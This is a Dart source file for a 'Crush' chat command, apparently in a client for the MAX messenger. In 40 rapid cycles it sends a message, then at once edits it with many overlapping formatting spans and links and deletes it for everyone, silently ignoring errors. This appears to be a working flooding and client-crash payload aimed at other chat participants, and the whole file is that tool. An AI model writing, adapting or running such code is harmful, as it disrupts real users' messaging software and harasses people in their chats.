import 'dart:async';

import 'slash_command.dart';

const int _cycles = 40;
const Duration _delay = Duration(milliseconds: 400);

const String _text =
    'burmaldaburmaldaburmaldaburmaldaburmaldaburmaldaburmaldaburmalda';

const List<Map<String, dynamic>> _elements = [
  {'type': 'STRONG', 'from': 0, 'length': 1},
  {'type': 'EMPHASIZED', 'from': 1, 'length': 1},
  {'type': 'UNDERLINE', 'from': 2, 'length': 1},
  {'type': 'STRIKETHROUGH', 'from': 3, 'length': 1},
  {'type': 'STRONG', 'from': 4, 'length': 2},
  {'type': 'STRONG', 'from': 6, 'length': 1},
  {'type': 'EMPHASIZED', 'from': 6, 'length': 1},
  {'type': 'STRONG', 'from': 7, 'length': 1},
  {'type': 'EMPHASIZED', 'from': 7, 'length': 1},
  {'type': 'STRIKETHROUGH', 'from': 7, 'length': 1},
  {'type': 'STRONG', 'from': 8, 'length': 1},
  {'type': 'EMPHASIZED', 'from': 8, 'length': 1},
  {'type': 'UNDERLINE', 'from': 8, 'length': 1},
  {'type': 'STRIKETHROUGH', 'from': 8, 'length': 1},
  {'type': 'STRONG', 'from': 9, 'length': 1},
  {'type': 'EMPHASIZED', 'from': 9, 'length': 1},
  {'type': 'STRIKETHROUGH', 'from': 9, 'length': 1},
  {'type': 'STRIKETHROUGH', 'from': 13, 'length': 3},
  {'type': 'STRONG', 'from': 16, 'length': 2},
  {'type': 'STRIKETHROUGH', 'from': 16, 'length': 2},
  {'type': 'STRONG', 'from': 18, 'length': 5},
  {'type': 'EMPHASIZED', 'from': 18, 'length': 5},
  {'type': 'STRIKETHROUGH', 'from': 18, 'length': 5},
  {'type': 'STRONG', 'from': 23, 'length': 2},
  {'type': 'EMPHASIZED', 'from': 23, 'length': 2},
  {'type': 'UNDERLINE', 'from': 23, 'length': 2},
  {'type': 'STRIKETHROUGH', 'from': 23, 'length': 2},
  {'type': 'STRONG', 'from': 25, 'length': 1},
  {'type': 'EMPHASIZED', 'from': 25, 'length': 1},
  {'type': 'UNDERLINE', 'from': 25, 'length': 1},
  {'type': 'STRONG', 'from': 26, 'length': 2},
  {'type': 'UNDERLINE', 'from': 26, 'length': 2},
  {'type': 'STRONG', 'from': 28, 'length': 3},
  {'type': 'EMPHASIZED', 'from': 28, 'length': 3},
  {'type': 'UNDERLINE', 'from': 28, 'length': 3},
  {'type': 'EMPHASIZED', 'from': 31, 'length': 2},
  {'type': 'EMPHASIZED', 'from': 33, 'length': 2},
  {'type': 'UNDERLINE', 'from': 33, 'length': 2},
  {'type': 'STRONG', 'from': 35, 'length': 6},
  {'type': 'EMPHASIZED', 'from': 35, 'length': 6},
  {'type': 'UNDERLINE', 'from': 35, 'length': 6},
  {'type': 'STRONG', 'from': 41, 'length': 2},
  {'type': 'UNDERLINE', 'from': 41, 'length': 2},
  {'type': 'STRONG', 'from': 43, 'length': 8},
  {'type': 'UNDERLINE', 'from': 43, 'length': 8},
  {'type': 'STRIKETHROUGH', 'from': 43, 'length': 8},
  {'type': 'UNDERLINE', 'from': 51, 'length': 7},
  {'type': 'STRIKETHROUGH', 'from': 51, 'length': 7},
  {'type': 'STRIKETHROUGH', 'from': 58, 'length': 5},
  {'type': 'MONOSPACED', 'from': 0, 'length': 4},
  {'type': 'MONOSPACED', 'from': 9, 'length': 4},
  {'type': 'MONOSPACED', 'from': 16, 'length': 7},
  {'type': 'MONOSPACED', 'from': 25, 'length': 6},
  {'type': 'MONOSPACED', 'from': 33, 'length': 8},
  {'type': 'MONOSPACED', 'from': 43, 'length': 8},
  {'type': 'MONOSPACED', 'from': 51, 'length': 7},
  {'type': 'MONOSPACED', 'from': 58, 'length': 5},
  {
    'type': 'LINK',
    'from': 0,
    'length': 8,
    'attributes': {'url': 'https://vk.com'},
  },
  {
    'type': 'LINK',
    'from': 24,
    'length': 16,
    'attributes': {'url': 'https://max.ru'},
  },
  {
    'type': 'LINK',
    'from': 48,
    'length': 16,
    'attributes': {'url': 'https://web.max.ru'},
  },
];

Future<void> runCrush(CommandContext ctx) async {
  if (!ctx.isOnline()) {
    ctx.notify('Нет соединения');
    return;
  }
  ctx.notify('Crush: запуск ($_cycles циклов)');
  for (var i = 0; i < _cycles; i++) {
    if (!ctx.isActive()) return;
    unawaited(_cycle(ctx));
    await Future.delayed(_delay);
  }
  if (ctx.isActive()) ctx.notify('Crush: завершено');
}

Future<void> _cycle(CommandContext ctx) async {
  try {
    final id = await ctx.messages.sendMessage(ctx.accountId, ctx.chatId, _text);
    if (id.isEmpty) return;
    await Future.wait([
      ctx.messages.editMessage(
        ctx.chatId,
        id,
        text: _text,
        elements: _elements,
        sendAttachments: true,
      ),
      ctx.messages.deleteMessages(ctx.chatId, [id], forEveryone: true),
    ]);
  } catch (_) {}
}
